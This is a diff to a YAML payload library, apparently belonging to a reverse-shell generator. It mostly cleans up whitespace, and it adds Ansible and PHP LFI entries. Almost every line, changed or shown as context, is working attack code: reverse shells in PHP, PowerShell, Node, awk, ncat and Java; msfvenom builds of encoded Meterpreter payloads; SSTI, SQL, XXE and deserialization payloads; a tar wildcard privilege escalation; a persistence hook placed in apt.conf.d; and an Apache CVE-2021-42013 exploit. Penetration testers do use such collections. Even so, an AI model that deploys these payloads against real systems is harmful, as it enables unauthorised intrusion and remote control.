@@ -77,7 +77,7 @@ payload:
   c:
     - |
       Compile : gcc shell.c -o shell
-      
+
       #include <stdio.h>
       #include <sys/socket.h>
       #include <sys/types.h>
@@ -273,7 +273,7 @@ payload:
       ?>
     - |
       # System()
-      
+
       <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>
       <?php system("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
       <?php system("echo {BASE64} | base64 -d | bash"); ?>
@@ -281,7 +281,7 @@ payload:
       <?php system("curl http://{IP}/shell.php|php"); ?>
     - |
       # Exec()
-      
+
       <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
       <?php exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
       <?php exec("echo {BASE64} | base64 -d | bash"); ?>
@@ -289,7 +289,7 @@ payload:
       <?php exec("curl http://{IP}/shell.php|php"); ?>
     - |
       # Shell_Exec()
-      
+
       <?php shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
       <?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
       <?php shell_exec("echo {BASE64} | base64 -d | bash"); ?>
@@ -297,7 +297,7 @@ payload:
       <?php shell_exec("curl http://{IP}/shell.php|php"); ?>
     - |
       # Passthru()
-      
+
       <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
       <?php passthru("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
       <?php passthru("echo {BASE64} | base64 -d | bash"); ?>
@@ -305,14 +305,14 @@ payload:
       <?php passthru("curl http://{IP}/shell.php|php"); ?>
     - |
       # Preg_replace()
-      
+
       <?php preg_replace('/.*/e', 'system("echo {BASE64} | base64 -d | bash");', ''); ?>
       <?php preg_replace('/.*/e', 'exec("echo {BASE64} | base64 -d | bash");', ''); ?>
       <?php preg_replace('/.*/e', 'passthru("echo {BASE64} | base64 -d | bash");', ''); ?>
       <?php preg_replace('/.*/e', 'shell_exec("echo {BASE64} | base64 -d | bash");', ''); ?>
     - |
       # Backtick
-      
+
       <?php $output = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f`; echo "<pre>$output</pre>"; ?>
       <?php $output = `/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'`; echo "<pre>$output</pre>"; ?>
       <?php $output = `echo {BASE64} | base64 -d | bash`; echo "<pre>$output</pre>"; ?>
@@ -326,7 +326,7 @@ payload:
     - |
       # Save as shell.pl
       # Exploit: perl shell.pl
-      
+
       use Socket
 
       $i="{IP}";
@@ -352,14 +352,14 @@ payload:
       end
     - |
       exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f")
-  haskell: 
+  haskell:
     - |
       module Main where
 
       import System.Process
 
       main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f"
-  powershell: 
+  powershell:
     - |
       powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
     - |
@@ -386,7 +386,7 @@ payload:
       => Original : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}
 
       powershell.exe -e {BASE64PS1_3}
-  node: 
+  node:
     - |
       (function(){
       var net = require("net"),
@@ -437,10 +437,10 @@ payload:
       sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
     - |
       # Others
-      
+
       require('fs').readFileSync("/etc/passwd").toString('utf8')
-      
-  awk: 
+
+  awk:
     - |
       awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ncat:
@@ -448,7 +448,7 @@ payload:
       ncat {IP} {PORT} -e /bin/bash
     - |
       ncat --udp {IP} {PORT} -e /bin/bash
-  msf_exe: 
+  msf_exe:
     - |
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe
 
@@ -458,7 +458,7 @@ payload:
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -o shell.exe
     - |
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -e x86/shikata_ga_nai -b '\x00' -i 3 -o shell.exe 
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f exe -e x86/shikata_ga_nai -b '\x00' -i 3 -o shell.exe
 
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
 
@@ -469,7 +469,7 @@ payload:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
 
       msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f exe -o shell.exe
-  ssti: 
+  ssti:
     - |
       #Twig
 
@@ -484,17 +484,17 @@ payload:
       {% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f').read()}}{%endif%}{%endfor%}
     - |
       # Tornado
-      
+
       {% import os %}{{os.system('echo {BASE64} | base64 -d | bash')}}
-      
+
       {% import os %}{{os.system('echo {BASE64_URLENCODE} | base64 -d | bash')}}
     - |
       # PugJS
-      
+
       #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64} | base64 -d | bash')}()}
-      
+
       #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo {BASE64_URLENCODE} | base64 -d | bash')}()}
-      
+
 
       #References
 
@@ -512,7 +512,7 @@ payload:
       ## Apache 2.4.50 (CVE-2021-42013)
 
       curl -s --path-as-is -d "echo Content-Type: text/plain; echo; echo {BASE64} | base64 -d | bash" "http://localhost/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
-  jenkins: 
+  jenkins:
     - |
       String host="{IP}";
       int port={PORT};
@@ -522,7 +522,7 @@ payload:
       r = Runtime.getRuntime()
       p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
       p.waitFor()
-  tarpriv: 
+  tarpriv:
     - |
       touch -- "--checkpoint=1"
       touch -- "--checkpoint-action=exec=sh shell.sh"
@@ -537,12 +537,12 @@ payload:
       chmod 777 ./"--checkpoint=1"
       chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
       chmod 777 shell.sh
-  pickle: 
+  pickle:
     - |
       {PICKLE}
     - |
       {PICKLE_BASH}
-  java: 
+  java:
     - |
       Usage : java shell.java
       Usage : javac shell.java
@@ -1041,7 +1041,7 @@ payload:
       <configuration>
       <system.webServer>
       <handlers accessPolicy="Read, Script, Write">
-      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
       </handlers>
       <security>
       <requestFiltering>
@@ -1073,7 +1073,7 @@ payload:
       <% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_3}").StdOut.Readall() %>
     - |
       <% eval request("cmd") %>
-  xxe: 
+  xxe:
     - |
       #Payload (Save as shell.sh)
 
@@ -1112,9 +1112,9 @@ payload:
       <data>
         <name>&xxe;</name>
       </data>
-    - | 
+    - |
       #Extra
-      
+
       # send this on the application
       <?xml version="1.0" ?>
       <!DOCTYPE message [
@@ -1128,7 +1128,7 @@ payload:
       <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
       %eval;
       %error;
-  jsp: 
+  jsp:
     - |
       #Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.jsp
 
@@ -1179,7 +1179,7 @@ payload:
       ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
       ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
       } catch( Exception e ) {}
-  c#: 
+  c#:
     - |
       #Windows (Save as shell.cs)
 
@@ -1323,7 +1323,7 @@ payload:
 
       }
       }
-  xsl: 
+  xsl:
     - |
       # Save as shell.xsl
 
@@ -1333,7 +1333,7 @@ payload:
       <xsl:value-of select="php:function('system','echo {BASE64} | base64 -d | bash')" />
       </body>
       </html>
-  yaml: 
+  yaml:
     - |
       --- !ruby/object:Gem::Requirement
       requirements:
@@ -1369,8 +1369,8 @@ payload:
       !!python/object/apply:subprocess.getoutput
         - echo {BASE64} | base64 -d | bash
 
-      {YAML_PY} 
-  sql: 
+      {YAML_PY}
+  sql:
     - |
       # PostgreSQL (1)
 
@@ -1380,7 +1380,7 @@ payload:
       username=';SELECT+*+FROM+cmd_exec;--&password='
     - |
       # PostgreSQL (2)
-      
+
       DROP TABLE IF EXISTS cmd_exec;
       CREATE TABLE cmd_exec(cmd_output text);
       COPY cmd_exec FROM PROGRAM 'echo {BASE64} | base64 -d | bash';
@@ -1395,7 +1395,7 @@ payload:
       EXEC xp_cmdshell "powershell iex(iwr -usebasicparsing http://{IP}/shell.ps1)";
 
       => You can try use : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
-  wordpress: 
+  wordpress:
     - |
       <?php
 
@@ -1414,7 +1414,7 @@ payload:
       => save as shell.php
       => zip shell.zip shell.php
       => Upload Plugin and Activate
-  json.net: 
+  json.net:
     - |
       {
       '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
@@ -1438,7 +1438,7 @@ payload:
 
       ## References
       - https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
-  msf_raw: 
+  msf_raw:
     - |
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o payload.bin
 
@@ -1448,7 +1448,7 @@ payload:
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -o payload.bin
     - |
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.bin 
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.bin
 
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
 
@@ -1459,7 +1459,7 @@ payload:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
 
       msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
-  msf_dll: 
+  msf_dll:
     - |
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o payload.dll
 
@@ -1469,7 +1469,7 @@ payload:
 
       msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -o payload.dll
     - |
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.dll 
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.dll
 
       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
@@ -1480,7 +1480,7 @@ payload:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
       msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
-  msf_elf: 
+  msf_elf:
     - |
       msfvenom -p linux/x64/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf
 
@@ -1489,7 +1489,7 @@ payload:
       msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf
 
       msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf
-    - | 
+    - |
       msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -e x86/shikata_ga_nai -i 3 -o shell.elf
 
       msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
@@ -1501,7 +1501,7 @@ payload:
       msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
 
       msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
-  dag: 
+  dag:
     - |
       => Save it as script.py and put into /dags directory
 
@@ -1521,7 +1521,7 @@ payload:
     - |
       => Save this as exploit.sql and transfer to victim machine.
       => Base64 (Original) = IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')
-      
+
       CREATE TABLE a( x blob);
       ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\shell.asp';
       ALTER DATABASE BEGIN BACKUP;
@@ -1541,10 +1541,18 @@ payload:
 
 
       => Open shell.asp on web
-  apt_confd: 
+  apt_confd:
     - |
+      # apt update or
+      # apt changelog apt or
+      # apt changelog nano
+
       echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"};' > /etc/apt/apt.conf.d/pwn
     - |
+      # apt update or
+      # apt changelog apt or
+      # apt changelog nano
+
       echo 'apt::Update::Pre-Invoke {"echo {BASE64} | base64 -d | bash"};' > /etc/apt/apt.conf.d/pwn
   gdb_server:
     - |
@@ -1598,10 +1606,10 @@ payload:
       }
     - |
       {LOG4J}
-  zabbix:      
+  zabbix:
     - |
       # Create Item > Put inside Key
-      system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",nowait]      
+      system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",nowait]
     - |
       # Create Item > Put inside Key
       system.run[echo {BASE64} | base64 -d | bash,nowait]
@@ -1623,17 +1631,33 @@ payload:
       #include <stdlib.h>
       void _init() {
           system("echo {BASE64} | base64 -d | bash");
-      }      
-      
+      }
+
       2. gcc -fPIC -shared -nostartfiles -o shell.so shell.c
       3. python3 -m http.server 80
       4. curl {IP}/shell.so -o /tmp/shell.so
       5. mysql -u root -p'root' -e 'SET GLOBAL wsrep_provider="/tmp/shell.so"'
-      
-      
-      
-      
-      
-      
-      
-      
+  ansible:
+    - |
+      sudo ansible -m command localhost -a 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"'
+  php_lfi:
+    - |
+      # Examples (PHPINFO)
+      <?php phpinfo(); ?>
+
+      {PHP_LFI}
+    - |
+      # System (nc)
+      <?php system("nc {IP} {PORT} -e /bin/sh"); ?>
+
+      {PHP_LFI}
+    - |
+      # System (curl + sh)
+      <?php system("curl {IP}/a | /bin/sh"); ?>
+
+      {PHP_LFI}
+    - |
+      # System (python3)
+      <?php system("echo '{BASE64_PY3}' | base64 -d | bash"); ?>
+
+      {PHP_LFI}
